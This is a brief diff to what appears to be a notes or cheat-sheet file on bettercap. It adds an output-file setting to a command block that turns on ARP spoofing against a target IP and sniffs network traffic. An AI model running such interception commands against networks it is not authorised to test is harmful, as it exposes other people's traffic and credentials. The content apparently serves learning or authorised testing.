@@ -289,6 +289,7 @@ set arp.spoof.fullduplex true
 set arp.spoof.targets [targetIP]
 arp.spoof on
 set net.sniff.local true
+set net.sniff.output outputfile.cap (to open in wireshark)
 net.sniff on
 ```
 and save as e.g. sniffing.cap
